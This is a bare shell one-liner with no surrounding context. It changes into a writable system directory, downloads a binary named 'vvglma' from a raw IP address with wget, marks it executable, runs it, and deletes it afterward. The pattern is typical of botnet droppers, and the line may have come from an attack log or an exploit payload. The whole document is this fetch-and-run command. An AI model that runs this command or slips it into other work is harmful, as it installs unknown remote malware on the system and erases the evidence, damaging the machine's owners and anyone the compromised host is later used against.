cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25.144/vvglma; chmod +x vvglma; ./vvglma; rm -rf vvglma
